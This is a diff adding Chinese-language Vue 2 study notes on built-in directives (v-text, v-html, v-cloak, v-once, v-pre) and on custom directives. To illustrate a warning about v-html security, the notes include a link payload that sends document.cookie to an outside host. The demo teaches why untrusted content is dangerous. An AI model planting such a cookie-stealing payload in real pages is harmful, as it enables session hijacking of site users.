@@ -263,3 +263,589 @@ doSubmit() {
 
 
 
+
+
+## 内置指令
+
+我们学过的指令:
+
+| 指令    | 作用                             |
+| ------- | -------------------------------- |
+| v-bind  | 单向绑定解析表达式，可简写为:xxx |
+| v-model | 双向数据绑定                     |
+| v-for   | 遍历数组/对象/字符串             |
+| v-on    | 绑定事件监听，可简写为@          |
+| v-if    | 条件渲染（动态控制节点是否存在)  |
+| v-else  | 条件渲染（动态控制节点是否存在)  |
+| v-show  | 条件渲染（动态控制节点是否展示)  |
+|         |                                  |
+
+### v-text指令
+
+- 作用:向其所在的节点中渲染文本内容。
+- 与插值语法的区别:v-text会替换掉节点中的内容，{{xx}}则不会。
+
+
+
+示例：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <h1>{{name}}</h1>
+        <!-- 将属性的所有文本信息替换当前标签的内容 -->
+        <h1 v-text='name'></h1>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                name: '尚硅谷'
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+执行结果：
+
+![image-20220907203831791](../../../md-photo/image-20220907203831791.png)
+
+
+
+v-text会替换掉标签中的内容：
+
+```html
+<h1 v-text='name'>你好，</h1>
+```
+
+![image-20220907204246338](../../../md-photo/image-20220907204246338.png)
+
+v-text不会解析属性中的html元素：
+
+![image-20220907204326062](../../../md-photo/image-20220907204326062.png)
+
+
+
+### v-html
+
+#### 定义及案例
+
+- 作用:向指定节点中渲染包含html结构的内容。
+  - 与插值语法的区别:
+    - v-html会替换掉节点中所有的内容，{{xx}}则不会。
+    - v-html可以识别html结构。
+  - 严重注意: v-html有安全性问题!!!
+    - 在网站上动态渲染任意HTML是非常危险的,容易导致XSS攻击。
+    - **<font color='red'>一定要在可信的内容上使用v-html，永不要用在用户提交的内容上</font>**!
+
+相对于v-text来说，v-html可以解析字符串中的html标签：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <!-- 将属性的所有文本信息替换当前标签的内容 -->
+        <div v-html='str'></div>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                str: '<h3>你好啊！</h3>'
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+执行结果：
+
+![image-20220907204528054](../../../md-photo/image-20220907204528054.png)
+
+
+
+#### v-html安全问题
+
+cookie的工作流程：
+
+![image-20220907205511790](../../../md-photo/image-20220907205511790.png)
+
+
+
+cookie不能跨浏览器使用：
+
+![image-20220907205655420](../../../md-photo/image-20220907205655420.png)
+
+
+
+浏览器查看cookie信息：
+
+![image-20220907210016558](../../../md-photo/image-20220907210016558.png)
+
+
+
+代码演示：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <!-- 将属性的所有文本信息替换当前标签的内容 -->
+        <div v-html='str'></div>
+
+        <div v-html='href'></div>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                str: '<h3>你好啊！</h3>',
+                href: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你要的资源了，快来！</a>'
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+结果：
+
+![image-20220907212113101](../../../md-photo/image-20220907212113101.png)
+
+
+
+### v-cloak指令
+
+- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}的问题。
+
+降低浏览器的网速：
+
+![image-20220907214109707](../../../md-photo/image-20220907214109707.png)
+
+
+
+源代码：
+
+```html
+<style>
+    /* 属性选择器 */
+    [v-cloak] {
+        display: none;
+    }
+</style>
+
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <!-- v-cloak标签在Vue介入之后会被删掉，配置style样式可以避免{{name}}等模板字符出现在页面上 -->
+        <div v-cloak>{{name}}</div>
+        <!-- 此时引入的js需要在页面生成之后 -->
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js"></script>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                name: '尚硅谷'
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+效果：
+
+![image-20220907214258264](../../../md-photo/image-20220907214258264.png)
+
+
+
+Vue介入的时候展示对应的内容：
+
+![image-20220907214327891](../../../md-photo/image-20220907214327891.png)
+
+
+
+### v-once指令
+
+- v-once所在节点在初次动态渲染后，就视为静态内容了。
+- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+
+
+源代码：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <h1 v-once>初始化的n值是：{{n}}</h1>
+        <h1>当前的n值是：{{n}}</h1>
+        <button @click='n++'>点我n+1</button>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+执行结果：
+
+![image-20220907215203185](../../../md-photo/image-20220907215203185.png)
+
+
+
+### v-pre指令
+
+-  跳过其所在节点的编译过程。
+- 可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。
+
+源代码：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <h1>Vue其实很简单</h1>
+        <h1 v-pre>当前的n值是：{{n}}</h1>
+        <button v-pre @click='n++'>点我n+1</button>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+结果：
+
+![image-20220907215814091](../../../md-photo/image-20220907215814091.png)
+
+
+
+## 自定义指令
+
+### 定义
+
+- 定义语法:
+
+  - 局部指令:
+
+  ```javascript
+  new Vue({
+      directives:{指令名:配置对象};
+  });
+  ```
+
+  或者
+
+  ```javascript
+  new Vue({
+      directives{指令名:回调函数};
+  });
+  ```
+
+  - 全局指令
+
+  ```javascript
+  Vue.directive(指令名,配置对象);
+  ```
+
+  或者
+
+  ```javascript
+  Vue.directive(指令名,回调函数);
+  ```
+
+  
+
+- 配置对象中常用的3个回调
+
+  - bind:指令与元素成功绑定时调用。
+  - inserted:指令所在元素被插入页面时调用。
+  - update:指令所在模板结构被重新解析时调用。
+
+- 备注
+
+  - 指令定义时不加v-，但使用时要加v-;
+  - 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+
+
+
+### 需求
+
+- 定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+- 定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
+
+
+
+### 需求一实例
+
+源代码：
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <h1>当前的n值是：<span v-text='n'></span></h1>
+        <h1>放大十倍后的n值是：<span v-big='n'></span></h1>
+        <button @click='n++'>点我n+1</button>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            },
+
+
+            // 自定义指令
+            directives: {
+                // 将n值放大10倍
+                // 什么时候调用？1.指令与元素成功绑定时（一上来时就调用）。2.指令所在的模板重新解析时。
+                // 第一参数是真实的DOM元素，这里是span；第二个参数是自定义指令的信息，包括名字、表达式、值等
+                big(element, binding) {
+                   // console.log(element instanceof HTMLElement);
+                   // console.log(element, binding);
+                   // 将标签中的值放大10倍
+                   element.innerText = binding.value * 10;
+                }
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+自定义指令的参数：
+
+![image-20220907221151023](../../../md-photo/image-20220907221151023.png)
+
+
+
+执行结果：
+
+![image-20220907221846725](../../../md-photo/image-20220907221846725.png)
+
+
+
+### 需求二实例
+
+源代码：
+
+<font color='red'>注意：bind、inserted、update的执行时机。</font>
+
+```html
+<body>
+    <!-- 准备一个容器 -->
+    <div id='root'>
+        <input type="text" v-fbind:value='n'>
+    </div>
+
+    <script type="text/javascript">
+        new Vue({
+            el: '#root',
+            data: {
+                n: 1
+            },
+
+
+            // 自定义指令
+            directives: {
+                // 自动获取焦点
+                // fbind(element, binding) {
+                //     element.value = binding.value;
+                //     // focus方法执行顺序在input框生成完成之后才奏效。但是[以方法的形式]自定义指定与元素成功绑定时就调用，
+                //     // 此时没有生成input框元素，所以导致focus方法失效。所以此时需要[以对象的形式]自定义指定。
+                //     element.focus();
+                // }
+
+                fbind: {
+                    // 指令与元素成功绑定时调用（一上来就调用）
+                    bind(element, binding) {
+                        // console.log("bind");
+                        element.value = binding.value;
+                    },
+
+                    // 指令所在的元素插入页面时
+                    inserted(element, binding) {
+                        // console.log("inserted");
+                        element.focus();
+                    },
+
+                    // 指令所在的模板被重新解析时
+                    update(element, binding) {
+                        // console.log("update");
+                        element.value = binding.value;
+                        // element.focus();
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+```
+
+
+
+执行结果：
+
+页面初始化时，成功赋予了初始值，并获得了焦点：
+
+![image-20220907224415881](../../../md-photo/image-20220907224415881.png)
+
+模板重新解析时，同时更新了对应的值：
+
+![image-20220907224452062](../../../md-photo/image-20220907224452062.png)
+
+### 避坑指南
+
+boy里面的html标签内容：
+
+```html
+<!-- 准备一个容器 -->
+<div id='root'>
+    <h1>当前的n值是：<span v-text='n'></span></h1>
+    <h1>放大十倍后的n值是：<span v-big='n'></span></h1>
+    <!-- 指令不能使用驼峰法，风格指南推荐使用-符号隔开 -->
+    <h3>放大十倍后的n值是（big-number）：<span v-big-number='n'></span></h3>
+    <button @click='n++'>点我n+1</button>
+    <br />
+
+    <input type="text" v-fbind:value='n'>
+    <br/>
+</div>
+
+<div id="root2">
+    <button @click='n++'>点我（root2）n+1</button>
+    <br/>
+    <input type="text" v-fbind:value='n'>
+    <br/>
+    <h3>放大十倍后的n值是（root2-big-number）：<span v-big-number='n'></span></h3>
+</div>
+```
+
+
+
+#### 指定名字定义问题
+
+指令不能使用驼峰法，风格指南推荐使用-符号隔开
+
+```html
+<h3>放大十倍后的n值是（big-number）：<span v-big-number='n'></span></h3>
+```
+
+自定义的指令：
+
+```javascript
+// 不能使用简写的方式，只能恢复为原来的写法
+'big-number'(element, binding) {
+    element.innerText = binding.value * 10;
+}
+```
+
+
+
+#### 指令中的this问题
+
+指令中的this是window，如，我们在big指令中添加打印this的操作：
+
+```javascript
+big(element, binding) {
+    // console.log(element instanceof HTMLElement);
+    // console.log(element, binding);
+    // 将标签中的值放大10倍
+    element.innerText = binding.value * 10;
+    // 注意，此处的this是window
+    console.log('big的this是：', this);
+}
+```
+
+打印结果：
+
+![image-20220907230854711](../../../md-photo/image-20220907230854711.png)
+
+
+
+#### 可以全局定义指令
+
+使用Vue.directive()方法可以指定全局指令，在多个Vue实例中都可以使用，如我们将两个需求的指定都定义为全局变量：
+
+```javascript
+// 定义全局的自定指令，对象的方式
+Vue.directive('fbind', {
+
+    // 指令与元素成功绑定时调用（一上来就调用）
+    bind(element, binding) {
+        // console.log("bind");
+        element.value = binding.value;
+    },
+
+    // 指令所在的元素插入页面时
+    inserted(element, binding) {
+        // console.log("inserted");
+        element.focus();
+    },
+
+    // 指令所在的模板被重新解析时
+    update(element, binding) {
+        // console.log("update");
+        element.value = binding.value;
+        // element.focus();
+    }
+});
+
+// function的方式
+Vue.directive('big-number', function(element, binding) {
+    element.innerText = binding.value * 10;
+});
+```
+
+
+
+将原来Vue实例中重复的指令注释，并添加一个新的root2实例：
+
+```javascript
+new Vue({
+    el: '#root2',
+    data: {
+        n: 1
+    }
+});
+```
+
+
+
+测试结果：
+
+![image-20220907231409708](../../../md-photo/image-20220907231409708.png)
